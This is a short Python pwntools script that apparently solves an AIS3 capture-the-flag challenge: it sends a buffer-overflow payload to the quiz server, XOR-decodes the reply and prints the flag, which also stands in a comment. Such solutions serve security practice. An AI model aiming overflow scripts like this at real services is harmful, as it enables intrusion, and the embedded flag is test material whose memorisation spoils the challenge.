#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

#ais3{Just_a_simpl3_overflow}

host = 'quiz.ais3.org'
port = 56746
y = remote(host,port)


p = 'a' * 20
p += p32( 77 )


y.sendafter( ':' , p + '\n' )
y.sendafter( ':' , str( 77 ) + '\n' )
y.sendafter( ':' , '1\n' )

y.recvuntil( 'ic :' )

o = y.recv(1024)

log.success( o )

flag = ''.join( chr( ord( c ) ^ 77 ) for c in o )

log.success( flag )

y.interactive()